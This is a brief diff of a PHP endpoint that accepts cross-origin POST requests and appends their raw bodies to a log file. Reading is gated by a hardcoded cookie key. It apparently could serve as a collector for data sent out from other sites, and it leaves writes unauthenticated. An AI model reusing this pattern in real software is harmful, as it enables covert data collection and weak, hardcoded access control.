@@ -5,7 +5,7 @@ header('Access-Control-Allow-Origin: *');
 if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
     exit(0);
 } else if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $data = $_POST['data'] ?? '';
+    $data = file_get_contents("php://input");
     file_put_contents(__DIR__ . '/log.txt', $data . PHP_EOL, FILE_APPEND);
 } else {
     if ($_COOKIE['key'] === "dkfyqow") {
